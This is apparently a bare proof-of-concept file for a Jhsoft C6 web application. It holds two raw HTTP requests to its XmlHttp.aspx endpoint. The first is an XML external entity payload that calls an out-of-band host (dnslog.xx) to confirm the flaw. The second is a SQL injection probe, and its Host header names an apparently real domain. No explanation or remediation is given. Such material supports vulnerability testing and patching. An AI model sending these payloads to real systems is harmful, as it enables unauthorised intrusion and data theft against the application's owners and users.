`poc:`
```
POST /c6/Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx/ HTTP/1.1
Host: xxxx
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxetest [
<!ENTITY % remote SYSTEM "http://dnslog.xx/test">
%remote;]>
<xxetest/>

```


`poc`
```
http
POST /c6/Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="utf-8"?>
<root>
  <flag>GetTemplateById</flag>
  <id>SQLI_POC</id>
</root>
```
